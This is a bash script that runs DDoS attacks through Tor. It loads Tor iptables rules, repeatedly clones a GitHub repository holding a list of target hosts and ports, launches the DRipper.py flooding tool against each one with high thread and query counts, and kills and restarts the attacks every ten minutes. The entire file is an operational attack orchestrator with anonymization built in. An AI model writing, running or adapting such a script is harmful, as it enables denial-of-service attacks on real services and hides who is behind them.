#!/bin/bash

#   -h, --help     show this help message and exit
#   -l, --load     This option will load tor iptables rules
#   -f, --flush    This option flushes the iptables rules to default
#   -r, --refresh  This option will change the circuit and gives new IP
#   -i, --ip       This option will output the current public IP address

# TOR=`curl https://check.torproject.org/api/ip | jq -r .IsTor`

sudo toriptables2.py -i -l -r

while true; do
    # ps aux | grep 'Ripper.py'
    # if [ $? -eq 1 ]; then
        cd ~/
        git clone https://github.com/AlexViki/dst.git
        cd ~/dst
        for URL in $(cat destination.txt); do
            echo "------`hostname`------"
            echo "------`date`------"
            RIPPER_URL=`echo $URL | awk -F ':' '{print $1}'`
            RIPPER_PORT=`echo $URL | awk -F ':' '{print $2}'`
            cd && cd ~/DDoS-Ripper
            sudo python3 DRipper.py -s $RIPPER_URL -p $RIPPER_PORT -t 135 -q 10000 &
            sleep 5s
        done
    # else
    # fi
    sleep 10m
    for i in `ps aux | grep 'Ripper.py' | awk '{print $2}'`; do sudo kill -9 $i; done
done
#     TOR=`curl https://check.torproject.org/api/ip | jq -r .IsTor`
#     if !$TOP; then
#         #sudo toriptables2.py -i -l
#         sudo systemctl restart tor
#     fi
#     TOR=`curl https://check.torproject.org/api/ip | jq -r .IsTor`
# done